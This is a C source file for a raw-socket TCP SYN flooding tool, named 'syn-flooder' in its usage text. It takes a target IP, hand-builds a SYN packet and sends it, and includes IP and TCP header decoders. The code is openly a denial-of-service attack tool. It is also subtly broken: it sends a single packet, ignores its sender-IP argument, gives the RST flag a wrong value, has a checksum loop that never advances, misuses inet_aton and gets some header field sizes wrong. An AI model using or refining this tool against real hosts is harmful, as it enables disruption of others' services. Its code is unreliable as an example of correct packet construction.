#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/socket.h> // for socket functions
#include <netinet/in.h> // internet address structs & consts
#include <netinet/ip.h> // IP header structure

#include <errno.h> // error handling

struct ip_hdr {
  unsigned char ip_version_and_header_length;
  unsigned char ip_top;
  unsigned short ip_len;
  unsigned short ip_id;
  unsigned short ip_frag_offset;
  unsigned short ip_ttl;
  unsigned short ip_type;
  unsigned short ip_checksum;
  unsigned int ip_src_addr;
  unsigned int ip_dest_addr;
};

struct tcp_hdr {
  unsigned short tcp_src_port;
  unsigned short tcp_dest_port;
  unsigned int tcp_seq;
  unsigned int tcp_ack;
  unsigned char reserved:4;   // 4 bits from the 6 bits of reserved space
  unsigned char tcp_offset:4; // TCP data offset for little endian host
  unsigned char tcp_flags;    // TCP flags (and 2 bits from reserved space)
#define TCP_FIN  0x01
#define TCP_SYN  0x02
#define TCP_RST  0x03
#define TCP_PUSH 0x08
#define TCP_ACK  0x10
#define TCP_URG  0x20  
  unsigned short tcp_window;
  unsigned short tcp_checksum;
  unsigned short tcp_urgent;
};

void decode_ip(const u_char *);
u_int decode_tcp(const u_char *);
void build_tcp_syn(char *buffer);
short compute_tcp_checksum(char *buffer);

int main(int argc, char *argv[]) {
  int raw_socket; // raw IP socket
  char packet[100];
  struct sockaddr_in *address;
  socklen_t addrlen;

  if (argc != 3) {
    printf("Usage:\n");
    printf("./syn-flooder <target-ip> <sender-ip>\n");
    exit(1);
  }

  if ((address = (struct sockaddr_in *) malloc(sizeof(struct sockaddr_in))) == NULL) {
    printf("Error on malloc\n");
    exit(1);
  }

  addrlen = sizeof(struct sockaddr_in);
  
  if ((raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
    printf("Error creating socket: %s\n", strerror(errno));
    exit(1);
  }

  build_tcp_syn(packet);

  address->sin_family = AF_INET;
  address->sin_port = IPPROTO_TCP;
  (address->sin_addr).s_addr = inet_aton(argv[1]);
  
  if ((sendto(raw_socket, packet, sizeof(struct tcp_hdr), 0, (struct sockaddr *)address, addrlen)) == -1) {
    printf("Error sending data: %s\n", strerror(errno));
    exit(1);
  }

}

void build_tcp_syn(char *buffer) {
  struct tcp_hdr *header = (struct tcp_hdr *) buffer;

  header->tcp_src_port = htons(7890);
  header->tcp_dest_port = htons(7890);
  header->tcp_seq = htonl(1);
  header->tcp_ack = 0;
  header->reserved = 0;
  header->tcp_offset = 5;
  header->tcp_flags = TCP_SYN;
  header->tcp_window = htons(100);
  header->tcp_checksum = 0;
  header->tcp_urgent = 0;

  header->tcp_checksum = compute_tcp_checksum(buffer);
}

short compute_tcp_checksum(char *buffer) {
  struct tcp_hdr *header = (struct tcp_hdr *) buffer;
  int i;
  unsigned short checksum = 0;
  unsigned short *short_ptr = (unsigned short *)buffer;
  unsigned short short_holder = 0;

  // itero por los 10 conjuntos de 16 bits que conforman el
  // header TCP para calcular el checksum
  for (i = 0; i < 10; i++) {
    short_holder = htons(*buffer);
    checksum += short_holder;
  }

  return checksum;
}

void decode_ip(const u_char *header_start) {
  const struct ip_hdr *ip_header;

  ip_header = (const struct ip_hdr *)header_start;
  printf("\t(( Layer 3 ::: IP Header ))\n");
  printf("\t( Source: %s\t", inet_ntoa(ip_header->ip_src_addr));
  printf("Dest: %s)\n", inet_ntoa(ip_header->ip_dest_addr));
  printf("\t( Type: %u\t", (u_int) ip_header->ip_type);
  printf("ID: %hu\tLength: %u\n", ntohs(ip_header->ip_id), ntohs(ip_header->ip_len));
}

u_int decode_tcp(const u_char *header_start) {
  u_int header_size;
  const struct tcp_hdr *tcp_header;

  tcp_header = (const struct tcp_hdr *)header_start;
  header_size = 4 * tcp_header->tcp_offset;

  printf("\t\t{{ Layer 4 :::: TCP Header }}\n");
  printf("\t\t{ Src Port: %hu\t", ntohs(tcp_header->tcp_src_port));
  printf("Dest Port: %hu }\n", ntohs(tcp_header->tcp_dest_port));
  printf("\t\t{ Seq #: %u\t", ntohl(tcp_header->tcp_seq));
  printf("Ack #: %u }\n", ntohl(tcp_header->tcp_ack));
  printf("\t\t{ Header Size: %u\tFlags: ", header_size);

  if (tcp_header->tcp_flags & TCP_FIN)
    printf("FIN ");
  if (tcp_header->tcp_flags & TCP_SYN)
    printf("SYN ");
  if (tcp_header->tcp_flags & TCP_RST)
    printf("RST ");
  if (tcp_header->tcp_flags & TCP_PUSH)
    printf("PUSH ");
  if (tcp_header->tcp_flags & TCP_ACK)
    printf("ACK ");
  if (tcp_header->tcp_flags & TCP_URG)
    printf("URG ");
  printf(" }\n");

  return header_size;
}
